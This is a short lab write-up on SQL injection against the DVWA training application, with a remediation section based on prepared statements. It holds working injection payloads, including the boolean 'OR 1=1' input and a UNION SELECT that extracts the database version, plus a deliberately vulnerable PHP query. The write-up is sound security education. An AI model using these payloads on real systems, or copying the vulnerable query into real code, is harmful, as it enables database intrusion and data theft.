# A03  SQL Injection

**OWASP Reference:** A03:2021  
**Environment:** DVWA Low security (SQL Injection module)  
**Tools:** Firefox, DVWA

---

## What is it?

SQL Injection occurs when user input is embedded directly into a SQL query without sanitisation. An attacker can manipulate the query to extract, modify, or delete database data.

---

## Lab: Confirming the Vulnerability

DVWA's SQL Injection page accepts a numeric User ID and returns the username.

### Step 1  Normal input
```
Input: 1
Result: First name: admin, Surname: admin
```

### Step 2  Test for injection with single quote
```
Input: '
Result: Error  You have an error in your SQL syntax...
```
The error confirms the input is being passed directly to the SQL query.

### Step 3  Boolean-based test
```
Input: 1' OR '1'='1
Result: Returns ALL users
```

The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
Because `'1'='1'` is always true, the WHERE clause matches every row.

### Step 4  Extract database version
```
Input: 1' UNION SELECT null, version() -- -
Result: 5.7.44-0ubuntu0.18.04.1
```

---

## Impact

From this entry point an attacker could:
- Dump all usernames and password hashes from the users table
- Read files from the server (if DB user has FILE privilege)
- In some cases, write files and achieve RCE

---

## Remediation

- **Use prepared statements (parameterised queries)**  this is the primary fix
  ```php
  // Vulnerable
  $query = "SELECT * FROM users WHERE id = '$id'";

  // Fixed
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->execute([$id]);
  ```
- Validate and sanitise all user input
- Use a WAF as a secondary layer (not a primary defence)
- Run the database user with minimum required privileges
